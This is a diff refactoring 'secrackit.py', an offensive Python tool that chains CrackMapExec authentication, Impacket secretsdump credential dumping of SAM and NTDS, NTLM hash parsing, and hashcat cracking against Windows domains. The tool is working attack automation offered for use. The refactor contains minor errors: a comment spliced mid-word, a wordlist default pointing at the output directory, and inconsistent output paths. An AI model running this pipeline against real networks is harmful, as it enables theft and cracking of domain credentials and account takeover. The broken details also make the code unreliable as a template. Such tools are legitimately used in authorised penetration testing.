@@ -805,7 +702,7 @@ def parsed_secretsdump_list(combined_SAM_NTDS_results):
 	parsed_hashes = re.findall(NTLM_pattern, combined_SAM_NTDS_results)
 
 	# Found NTLM hashes moved into a list then map is ran in each item to replace the first two semi-colons (":") with a hyphen ("-").
-	parsed_hashes = list(map(lambda s: s.replace(":", "-", 2), parsed_hashes))
+	parsed_hashes: list[str] = list(map(lambda s: s.replace(":", "-", 2), parsed_hashes))
 
 	# Return results.
 	return(parsed_hashes)
@@ -813,7 +710,7 @@ def parsed_secretsdump_list(combined_SAM_NTDS_results):
 
 
 # Removes WDAG and disabled accounts from parsed dumps.
-def remove_default_hashes(ordered_per_IP_hash_list):
+def remove_default_hashes(ordered_per_IP_hash_list: list[list[str]]):
 
 	# NTLM hash representing disabled account on a Windows host.
 	disabled_account_hash = "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"
@@ -834,7 +731,7 @@ def remove_default_hashes(ordered_per_IP_hash_list):
 
 
 # Remove computer accounts from SAM dumps.
-def remove_computer_hashes(removed_default_hashes):
+def remove_computer_hashes(removed_default_hashes: list[list[str]]):
 	
 	# string to search for.
 	computer_hashes = "$-"
@@ -848,7 +745,7 @@ def remove_computer_hashes(removed_default_hashes):
 
 
 # Removes duplicate accounts in SAM results
-def remove_duplicate_hashes(removed_computer_hashes):
+def remove_duplicate_hashes(removed_computer_hashes: list[list[str]]):
 
 	# Create new list which doesn't include duplicate hashes through comprehension.
 	remove_duplicate_hashes = [[i for n, i in enumerate(sublist) if i not in sublist[:n]] for sublist in removed_computer_hashes]
@@ -859,10 +756,10 @@ def remove_duplicate_hashes(removed_computer_hashes):
 
 
 # Extract dictionary key values(a list), and saves output to combined list.
-def dict_key_value_to_IP_HASH(final_IP_to_hash):
+def dict_key_value_to_IP_HASH(final_IP_to_hash: dict[str, list[str]]):
 
 	# Create empty list
-	dict_to_single_list = list()
+	dict_to_single_list: list[tuple[str, str]] = []
 
 	# For each key in dictionary...
 	for key in final_IP_to_hash:
@@ -891,18 +788,6 @@ def tuples_to_list(dictionary_of_lists_to_list_of_tuples):
 	return(result)
 
 
-
-# hashes to be written to file
-def export_hashes_file(directory_location, NetworkID_for_files):
-	
-	# file location to be used when exporting sorted,labeled hashes to file
-	export_hashes_file_location = directory_location + "exported_hashes_" + NetworkID_for_files + ".txt"
-
-	# Return location
-	return(export_hashes_file_location)
-
-
-
 # Create file and append IP-{SAM, NTDS}-{domain.name\\}-ACCOUNT-RID-NTLM hashes to file.
 def list_of_hashes_to_file(list_of_hashes_as_strings, export_hashes_location):
 	
@@ -929,7 +814,12 @@ def list_of_hashes_to_file(list_of_hashes_as_strings, export_hashes_location):
 
 	else:
 		# If account used doesn't have admin access, it will likely fail but worth trying...
-		sys.exit("\n\nIt was worth a try...\nSecretsdump has failed administrative access to the target(s) above!\nNO NTLM hashes were dumped and no additional files were created!\n\nHashcat will not run!")
+		sys.exit(
+			"\n"
+			"Secretsdump has failed administrative access to the target(s) above!\n"
+			"NO NTLM hashes were dumped and no additional files were created!\n"
+			"Hashcat will not run!"
+		)
 
 
 
@@ -937,7 +827,7 @@ def list_of_hashes_to_file(list_of_hashes_as_strings, export_hashes_location):
 def hashcat_potfile_location(NetworkID_for_files, directory_location):
 
 	# File location for potfile, used for each run.
-	hashcat_potfile_location_is = directory_location + "hashcat.potfile_" + str(NetworkID_for_files)
+	hashcat_potfile_location_is = f"{directory_location}hashcat.potfile_{NetworkID_for_files}"
 
 	# Return location value
 	return(hashcat_potfile_location_is)
@@ -945,10 +835,19 @@ def hashcat_potfile_location(NetworkID_for_files, directory_location):
 
 
 # Run hashcat against exported hashes
-def run_hashcat(potfile_location, file_for_hashcat_location, wordlist_location, rule_location):
+def run_hashcat(potfile_location, file_for_hashcat_location, wordlist_location: Path, rule_location):
 
 	# Terminal feedback for which wordlist and/or rule hashcat is using...
-	print("\n\n\nAttempting to crack NTLM hashes!\n\nHashcat settings:\n  Wordlist: " + wordlist_location + "\n  Rule: No rule")
+	print(
+		"\n"
+		"\n"
+		"\n"
+		"Attempting to crack NTLM hashes!\n"
+		"\n"
+		"Hashcat settings:\n"
+		"  Wordlist: " + wordlist_location.name + "\n"
+		"  Rule: No rule"
+	)
 
 	# Code for taking in ntlm_hashes_file and outputting hashcat results
 	hashcat_cmd = subprocess.run(["hashcat", "-m", "1000", "--username", file_for_hashcat_location, wordlist_location, "--potfile-path", potfile_location], capture_output=True)
@@ -962,13 +861,27 @@ def run_hashcat(potfile_location, file_for_hashcat_location, wordlist_location, 
 
 
 # Run hashcat against exported hashes WITH custom rule
-def run_hashcat_rule(potfile_location, file_for_hashcat_location, wordlist_location, rule_location):
+def run_hashcat_rule(
+		potfile_location: str, 
+		file_for_hashcat_location: str, 
+		wordlist_location: Path, 
+		rule_location: io.TextIOWrapper
+	):
 
 	# Terminal feedback for which wordlist and/or rule hashcat is using...
-	print("\n\n\nAttempting to crack NTLM hashes!\n\nHashcat settings:\n  Wordlist: " + wordlist_location + "\n  Rule: " + rule_location)
+	print(
+		"\n"
+		"\n"
+		"\n"
+		"Attempting to crack NTLM hashes!\n"
+		"\n"
+		"Hashcat settings:\n"
+		f"  Wordlist: {wordlist_location}\n"
+		f"  Rule: {rule_location}\n"
+	)
 
 	# Code for taking in ntlm_hashes_file and outputting hashcat results
-	hashcat_cmd = subprocess.run(["hashcat", "-m", "1000", "--username", file_for_hashcat_location, wordlist_location, "--potfile-path", potfile_location, "--rules-file", rule_location], capture_output=True)
+	hashcat_cmd = subprocess.run(["hashcat", "-m", "1000", "--username", file_for_hashcat_location, str(wordlist_location), "--potfile-path", potfile_location, "--rules-file", str(rule_location)], capture_output=True)
 
 	# To convert the byte output to string.
 	hashcat_cmd_to_str = hashcat_cmd.stdout.decode()
@@ -977,20 +890,8 @@ def run_hashcat_rule(potfile_location, file_for_hashcat_location, wordlist_locat
 	return(hashcat_cmd_to_str)
 
 
-
-# File location for raw hashcat output
-def hashcat_raw_location(NetworkID_for_files, directory_location):
-
-	# File location for hashcat raw output to file.
-	hashcat_raw_location = directory_location + "hashcat_data_" + str(NetworkID_for_files) + ".txt"
-
-	# Return file location for raw hashcat
-	return(hashcat_raw_location)
-
-
-
 # export raw hashcat output to file
-def print_hashcat_raw(hashcat_results, hashcat_raw_file_location):
+def print_hashcat_raw(hashcat_results: str, hashcat_raw_file_location: str):
 
 	# Export to file the raw hashcat results
 	# Create file variable where data is written.
@@ -1011,7 +912,7 @@ def print_hashcat_raw(hashcat_results, hashcat_raw_file_location):
 
 
 # Display cracked hash results, which hashcat presents in output.
-def check_crack_percentage(hashcat_results):
+def check_crack_percentage(hashcat_results: str):
 
 	# Var holding string
 	NTDS_string_check = "Session..........: hashcat"
@@ -1045,12 +946,15 @@ def check_crack_percentage(hashcat_results):
 	clean_hashcat_percentage = re.sub("...: ", "", results)
 
 	# Print to screen the percentage of successful cracked NTLM hashes.
-	print("\nHashcat success rate: " + clean_hashcat_percentage + "\n")
+	print(
+		'\n'
+		f"Hashcat success rate: {clean_hashcat_percentage}\n"
+	)
 
 
 
 # Run hashcat again but with --show. This will result in our formatted output and creds appended!
-def final_cracked_list(potfile_location, file_for_hashcat_location):
+def final_cracked_list(potfile_location: str, file_for_hashcat_location: str):
 
 	# Code for taking in ntlm_hashes_file and outputting hashcat results
 	hashcat_results_cmd = subprocess.run(["hashcat", "-m", "1000", "--username", file_for_hashcat_location, "/usr/share/wordlists/rockyou.txt", "--potfile-path", potfile_location, "--show"], capture_output=True)
@@ -1058,140 +962,79 @@ def final_cracked_list(potfile_location, file_for_hashcat_location):
 	# To convert the byte output to string.
 	hashcat_results_cmd_to_str = hashcat_results_cmd.stdout.decode()
 
-	print("Cracked hashes exported to potfile:\n" + potfile_location + "\n")
+	print(
+		'Cracked hashes exported to potfile:\n'
+		f'{potfile_location}\n'
+	)
 
 	return(hashcat_results_cmd_to_str)
 
 
-
-# Create final file that holds --show from hashcat and the nice IP-account-etc format.
-def create_final_hashcat_results(directory_location, NetworkID_for_files):
-
-	# Final output file which will contain the final output.
-	final_hashcat_results_file = directory_location + "hashcat_FINAL_results_" + str(NetworkID_for_files) + ".txt"
-
-	# Return file location.
-	return(final_hashcat_results_file)
-
-
-
 # Export to file and show on terminal the results of --show from hashcat.
-def export_file_and_terminal_results(final_cracked_list_results, final_hashcat_results_location, directory_location):
-
+def export_file_and_terminal_results(final_cracked_list_results: str, final_hashcat_results_location: str, directory_location: Path):
 	# Open new file with write permission with naming convention.
-	export_final_data = open(final_hashcat_results_location, "a")
+	with open(final_hashcat_results_location, "a") as export_final_data:
+		# Write "removed_ansi_CME_output" to opened file.
+		export_final_data.write(final_cracked_list_results)
 
-	# Write "removed_ansi_CME_output" to opened file.
-	export_final_data.write(final_cracked_list_results)
-
-	# Close file, so it's no longer in use.
-	export_final_data.close()
-
-	print("Final hashcat results exported:\n" + final_cracked_list_results + "\nAll findings exported to directory: " +  directory_location)
-
-
-
-
-def main():
-
-	#################################
-	##### Argparse - Beginning #####
-
-	#### Args Explained
-	# DC_IP - since the script defaults to AD auths, the DC_IP is required.
-	# Domain - since the script defaults to AD auths, domain.name aka domain is required.
-	# Target_IPs - targets CME(CrackMapExec) and Impacket-secretsdump(secretsdump) will attack.
-	# Account - AD account both CME and secretsdump will use for their attacks.
-	# {pw, ntlm} - "pw" or "ntlm" argument is required as it helps determine which is provided.
-	# Pass_or_NTLM_val - value of password or NTLM hash required by CME and secretsdump.
-	### optional below
-	# -localauth - tells CME and secretsdump to auth against the IPs(hosts) and NOT the DC.
-	# -out_dir - By default, files created by secrackit.py will be exported to the directory which secrackit.py is launched from. This option allows you to specify a different root directory.
-	# -wordlist - Specify a custom wordlist for hashcat. /usr/share/wordlists/rockyou.txt runs by default when absent.
-	# -rule - Specify location of custom rule for hashcat. No rule used when absent.
-
-	parser = argparse.ArgumentParser(description="'secrackit.py' - Automates Windows auth checks(CrackMapExec), parses secretsdump(Impacket-secretsdump), and cracks NTLM hashes(Hashcat). For details visit https://github.com/PivotTheNet/secrackit.py", epilog="Example syntax: \"./secrackit.py 192.168.1.10 domain.local IPs.txt hackmyacct pw BadPassword123 -local -out_dir ~/Desktop/toolsoutput -wordlist ~/Desktop/wordlists/customwordlist.txt -rule ~/media/hashcatrules/OneRule.rule\"")
-
-	# Required arguments needed to run the script.
-	parser.add_argument("DC_IP", action="store", help="IP of domain controller.")
-	parser.add_argument("Domain", action="store", help="Domain.name where target(s) belong.", type=str)
-	parser.add_argument("Target_IPs", action="store", help="Target IP, CIDR, or location of file containing IPs. (one per line)", type=str)
-	parser.add_argument("Account", action="store", help="AD account used for authentication.", type=str)
-	parser.add_argument("Flag_Password_or_NTLM", action="store", help="Specify if providing a password (\"pw\") or NTLM hash (\"ntlm\") for authentication.", choices=(['pw', 'ntlm']), type=str)
-	parser.add_argument("Pass_or_NTLM_val", action="store", help="Password or NTLM hash associated with the provided AD account.", type=str)
-
-
-	# Optional arguments for specifying special options.
-	parser.add_argument("-localauth", action="store_true", help="Tells CME & Secretsdump to run against local authentication. (Default is domain authentication)")
-	parser.add_argument("-out_dir", action="store", nargs="?", const=1, help="Output directory for findings. (Defaults to the directory secrackit.py is ran from)", type=str)
-	parser.add_argument("-wordlist", action="store", nargs="?", const=1, help="Specify custom wordlist location for Hashcat. (Default is /usr/share/wordlists/rockyou.txt)", type=str)
-	parser.add_argument("-rule", nargs="?", const=1, help="Specify custom rule location for Hashcat. (Default is none)", type=str)
-
-
-	# Parse user arguments to allow code interactions.
-	args = parser.parse_args()
-	user_input_dc_ip = args.DC_IP
-	user_input_domain = args.Domain
-	user_input_target_ips = args.Target_IPs
-	user_input_username = args.Account
-	needs_converted_pw_hash_flag = args.Flag_Password_or_NTLM
-	user_input_password_or_ntlm_value = args.Pass_or_NTLM_val
-	user_input_dir_location = args.out_dir
-	user_input_local_flag = args.localauth
-	user_input_wordlist_loc = args.wordlist
-	user_input_rule_loc = args.rule
-
-
-	##### Argparse - Ending #####
-	##############################
-
-
-###Functions above ###
-######################
+	print(
+		"Final hashcat results exported:\n"
+		f"{final_cracked_list_results}\n"
+		f"All findings exported to directory: {directory_location}"
+	)
 
 
 
+DEFAULT_OUTPUT_DIRECTORY = './'
+DEFAULT_WORDLIST_PATH = '/usr/share/wordlists/rockyou.txt'
 
-	#####################################
-	##### Call functions - STARTING #####
-
-
+@app.command()
+def main(
+	domain_controller_ip: str,
+	domain_name: str, 
+	target_ips: Annotated[typer.FileText, typer.Argument(exists=True, dir_okay=False)], 
+	active_directory_account: str, 
+	flag_password_or_ntlm: Annotated[PasswordOrHashChoice, typer.Argument()],
+	password_or_ntlm_hash: str, 
+	local_auth: bool = False, 
+	output_directory: Annotated[Path, typer.Option(file_okay = False)] = Path(DEFAULT_OUTPUT_DIRECTORY), 
+	wordlist_path: Annotated[Path, typer.Option(exists=True, dir_okay=False)] = Path(DEFAULT_OUTPUT_DIRECTORY), 
+	rule_path: Annotated[Optional[typer.FileText], typer.Option(exists=True, dir_okay=False)] = None,
+):
+	# domain_controller_ip - since the script defaults to AD auths, the domain_controller_ip is required.
+	# domain_name - since the script defaults to AD auths, domain.name aka domain is required.
+	# target_ips - targets CME(CrackMapExec) and Impacket-secretsdump(secretsdump) will attack.
+	# active_directory_account - AD account both CME and secretsdump will use for their attacks.
+	# flag_password_or_ntlm - {pw, ntlm} - "pw" or "ntlm" argument is required as it helps determine which is provided.
+	# password_or_ntlm_hash - value of password or NTLM hash required by CME and secretsdump.
+	# --use_local_auth - tells CME and secretsdump to auth against the IPs(hosts) and NOT the DC.
+	# --output_directory - By default, files created by secrackit.py will be exported to the directory which secrackit.py is launched from. This option allows you to specify a different root directory.
+	# --wordlist - Specify a custom wordlist for hashcat. /usr/share/wordlists/rockyou.txt runs by default when absent.
+	# --rule-path - Specify location of custom rule for hashcat. No rule used when absent.
 	#### Validate user IP input return to variable.
-	validated_target_ip = validate_target_ips(user_input_target_ips)
-
-
-
-	#### Validate "-wordlist" aka "user_input_wordlist_loc" is present or not.
-	wordlist_location = validate_wordlist_input(user_input_wordlist_loc)
-
-
-
-	#### Validate "-rule" aka "user_input_rule_loc" is present or not.
-	rule_location = validate_rule_input(user_input_rule_loc)
-
-
-
+	validate_target_ips(target_ips)
+	
 	#### Argparse flags 'pw' and 'ntlm' are required options for input.
 	#### This converts them over to needed value for operating CrackMapExec.
-	converted_pw_hash_flag = convert_pw_or_hash_flag(needs_converted_pw_hash_flag, )
-
-
+	converted_pw_hash_flag = '-p' if flag_password_or_ntlm == 'pw' else '-H'
 
 	#### Parse NTLM or password input to determine which it is and provide feedback if needed.
-	validated_NTLM_hash_or_password = was_valid_hash_or_password_provided(user_input_password_or_ntlm_value, converted_pw_hash_flag)
+	validated_NTLM_hash_or_password = was_valid_hash_or_password_provided(password_or_ntlm_hash, converted_pw_hash_flag)
 
+	#### Create directory in current directory named (date/time)-secrackit.
+	#### Return the full path to the newly created directory.
+	directory_location = create_dir_for_dropping_that_output(output_directory)
 
 
 	#### Run CME against domain. If results authenticate or not, show response.
 	#### If successful, return results in decoded string format, to parse.
-	if user_input_local_flag == True:
+	if local_auth:
 
-		run_crackmapexec_function_output = run_crackmapexec_against_local(validated_target_ip, user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, user_input_local_flag)
+		run_crackmapexec_function_output = run_crackmapexec_against_local(target_ips, active_directory_account, converted_pw_hash_flag, validated_NTLM_hash_or_password, local_auth)
 
 	else:
 
-		run_crackmapexec_function_output = run_crackmapexec_against_domain(validated_target_ip, user_input_domain, user_input_username, converted_pw_hash_flag, validated_NTLM_hash_or_password, user_input_local_flag)
-
+		run_crackmapexec_function_output = run_crackmapexec_against_domain(target_ips, domain_name, active_directory_account, converted_pw_hash_flag, validated_NTLM_hash_or_password, local_auth)
 
 
 	#### Remove ANSI characters from the CME output.
@@ -1220,8 +1063,7 @@ def main():
 
 
 	#### Create directory in current directory named (date/time)-secrackit.
-	#### Return the full path to the newly created directory.
-	directory_location = create_dir_for_dropping_that_output(user_input_dir_location)
+	os.makedirs(directory_location)
 
 
 
@@ -1236,18 +1078,18 @@ def main():
 
 
 	# Create empty list, either local or domain function below, to dump data into.
-	secretsdump_raw_list = list()
+	secretsdump_raw_list: list[str] = []
 
 
 
 	# Local authentication with secretsdump. Run through for loop and append results.
 	print("\n\n\nStarting secretsdump attacks...")
 
-	if user_input_local_flag == True:
+	if local_auth == True:
 
 		for IP in range(0, len(IP_list_for_secretsdump)):
-			user_input_domain = IP_list_for_secretsdump[IP]
-			var_secretsdump_raw = run_impacket_secretsdump(user_input_domain, user_input_username, validated_NTLM_hash_or_password, IP_list_for_secretsdump[IP])
+			domain_name = IP_list_for_secretsdump[IP]
+			var_secretsdump_raw = run_impacket_secretsdump(domain_name, active_directory_account, validated_NTLM_hash_or_password, IP_list_for_secretsdump[IP])
 			secretsdump_raw_list.append(var_secretsdump_raw)
 
 
@@ -1255,13 +1097,13 @@ def main():
 	else:
 
 		for IP in range(0, len(IP_list_for_secretsdump)):
-			var_secretsdump_raw = run_impacket_secretsdump(user_input_domain, user_input_username, validated_NTLM_hash_or_password, IP_list_for_secretsdump[IP])
+			var_secretsdump_raw = run_impacket_secretsdump(domain_name, active_directory_account, validated_NTLM_hash_or_password, IP_list_for_secretsdump[IP])
 			secretsdump_raw_list.append(var_secretsdump_raw)
 
 
 
 	#### Create file location for secretsdump raw export.
-	secretsdump_raw_file_location = secretsdump_raw_file(NetworkID_for_files, directory_location)
+	secretsdump_raw_file_location = f"{directory_location}secretsdump_data_{NetworkID_for_files}.txt"
 
 
 
@@ -1271,17 +1113,17 @@ def main():
 
 
 	#### Extract SAM section from "secretsdump_raw_list" and labels each hash found.
-	SAM_section_parsed = list()
-	for item in range(0, len(secretsdump_raw_list)):
-		SAM_section = remove_SAM_section(secretsdump_raw_list[item])
+	SAM_section_parsed: list[str | None] = []
+	for item in secretsdump_raw_list:
+		SAM_section = remove_SAM_section(item)
 		SAM_section_parsed.append(SAM_section)
 
 
 
 	#### Extract NTDS section from "secretsdump_raw_list" and labels each hash found.
-	NTDS_section_parsed = list()
-	for item in range(0, len(secretsdump_raw_list)):
-		NTDS_section = remove_NTDS_section(secretsdump_raw_list[item])
+	NTDS_section_parsed: list[str | None] = []
+	for item in secretsdump_raw_list:
+		NTDS_section = remove_NTDS_section(item)
 		NTDS_section_parsed.append(NTDS_section)
 
 
@@ -1296,9 +1138,9 @@ def main():
 	#### Runs for loop for each in list through a function called "parsed_secretsdump_list".
 	#### Returning a list containing hashcat friendly formatted hashes.
 	#### Each returned list is appended to new list called ordered_per_IP_hash_list.
-	ordered_per_IP_hash_list = list()
-	for asset in range(0, len(combined_SAM_NTDS_results)):
-		seperate_parsed_lists = parsed_secretsdump_list(combined_SAM_NTDS_results[asset])	
+	ordered_per_IP_hash_list: list[list[str]] = []
+	for asset in combined_SAM_NTDS_results:
+		seperate_parsed_lists = parsed_secretsdump_list(asset)
 		ordered_per_IP_hash_list.append(seperate_parsed_lists)
 
 
@@ -1319,9 +1161,9 @@ def main():
 
 
 	#### IP list from each secretsdump list for dictionary list below.
-	Found_IPs_parsed = list()
-	for IP in range(0, len(secretsdump_raw_list)):
-		IP_from_secrets = parse_IP_from_secrets(secretsdump_raw_list[IP])
+	Found_IPs_parsed: list[str] = []
+	for IP in secretsdump_raw_list:
+		IP_from_secrets = parse_IP_from_secrets(IP)
 		Found_IPs_parsed.append(IP_from_secrets)
 
 
@@ -1343,7 +1185,7 @@ def main():
 
 
 	#### Create file for hash export.
-	export_hashes_location = export_hashes_file(directory_location, NetworkID_for_files)
+	export_hashes_location = f"{directory_location}exported_hashes_{NetworkID_for_files}.txt"
 
 
 
@@ -1358,28 +1200,28 @@ def main():
 
 
 	#### Create potfile location.
-	potfile_location = hashcat_potfile_location(NetworkID_for_files, directory_location)
+	potfile_location = f"{directory_location}hashcat.potfile_{NetworkID_for_files}"
 
 
 
 	#### Run hashcat with or without custom rule presented...
 	#### If "-rule" argument is equal to None, then run hashcat with no rule passed.
-	if rule_location == None:
-
+	if not rule_path:
 		# Running hashcat WITHOUT a custom rule present.
 		# Passing "rule_location" for terminal feedback.
-		hashcat_results = run_hashcat(potfile_location, file_for_hashcat_location, wordlist_location, rule_location)
+		# TODO type hashcat_results
+		hashcat_results = run_hashcat(potfile_location, file_for_hashcat_location, wordlist_path, rule_path)
 
 	else:
-
 		# Running hashcat WITH validated custom rule present.
-		# Passing "rule_location" for both hashcat and terminal feedback.
-		hashcat_results = run_hashcat_rule(potfile_location, file_for_hashcat_location, wordlist_location, rule_location)
+		# Passing "rule_location" f
+		# TODO type hashcat_resultsor both hashcat and terminal feedback.
+		hashcat_results = run_hashcat_rule(potfile_location, file_for_hashcat_location, wordlist_path, rule_path)
 
 
 
 	#### Create raw hashcat output file location.
-	hashcat_raw_file_location = hashcat_raw_location(NetworkID_for_files, directory_location)
+	hashcat_raw_file_location = f"{output_directory}hashcat_data_{NetworkID_for_files}.txt"
 
 
 
@@ -1398,11 +1240,11 @@ def main():
 
 
 	#### Create file for final hashcat results.
-	final_hashcat_results_location = create_final_hashcat_results(directory_location, NetworkID_for_files)
+	final_hashcat_results_location = f'{directory_location}hashcat_FINAL_results_{NetworkID_for_files}.txt'
 
 
 	#### Print off results to terminal and export to file.
-	exported_file_and_terminal_results = export_file_and_terminal_results(final_cracked_list_results, final_hashcat_results_location, directory_location)
+	exported_file_and_terminal_results = export_file_and_terminal_results(final_cracked_list_results, final_hashcat_results_location, output_directory)
 
 
 	##### Call functions - ENDING #####
@@ -1412,7 +1254,7 @@ def main():
 
 # Run the script and allow importing.
 if __name__ == "__main__":
-	main()
+	app()
 
 
 
